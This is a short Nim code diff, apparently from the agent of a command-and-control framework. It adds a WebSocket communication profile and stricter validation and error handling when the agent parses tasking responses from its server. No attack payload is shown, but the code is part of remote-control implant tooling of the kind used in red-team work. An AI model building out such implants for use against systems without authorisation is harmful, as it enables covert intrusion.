@@ -16,6 +16,8 @@ import config
 
 when defined(PROFILE_SMB):
   import profiles/smb as profile
+elif defined(PROFILE_WEBSOCKET):
+  import profiles/websocket as profile
 else:
   import profiles/http as profile
 
@@ -103,9 +105,28 @@ proc getTasking*() =
   let resp = sendAndRetrData(tasking)
   # only if a valid response is returned
   if resp.isSome:
+    let rawResp = resp.get()
 
+    if rawResp.kind != JObject:
+      DBG("[-] Invalid get_tasking response (not a JSON object)")
+      return
 
-    let tasking = to(resp.get(), Tasking)
+    if rawResp.hasKey("status"):
+      let statusVal = rawResp["status"].getStr("")
+      if statusVal != "" and statusVal != "success":
+        DBG("[-] get_tasking returned non-success status: " & statusVal)
+        return
+
+    if not rawResp.hasKey("tasks"):
+      DBG("[-] get_tasking response missing 'tasks'; skipping packet")
+      return
+
+    var tasking: Tasking
+    try:
+      tasking = to(rawResp, Tasking)
+    except CatchableError:
+      DBG("[-] Failed to parse get_tasking response: " & getCurrentExceptionMsg())
+      return
 
     # Add the tasks to the queue
     for task in tasking.tasks:
